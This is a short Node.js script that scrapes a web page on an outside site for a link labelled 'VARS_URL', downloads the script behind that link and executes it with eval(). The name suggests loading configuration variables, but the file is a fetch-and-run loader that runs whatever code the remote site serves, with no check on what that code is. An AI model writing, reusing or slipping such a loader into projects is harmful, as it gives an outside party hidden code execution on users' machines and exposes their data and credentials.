'use strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.ibrahimadams.site/files';

async function fetchVarsUrl() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const varsUrl = $(`a:contains("VARS_URL")`).attr('href');

        if (!varsUrl) throw new Error('VARS_URL not found on the webpage.');

        console.log('VARS_URL fetched successfully:', varsUrl);

        const scriptResponse = await axios.get(varsUrl);
        const scriptContent = scriptResponse.data;
        console.log("VARS_URL script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching VARS_URL:', error.message);
    }
}

fetchVarsUrl();
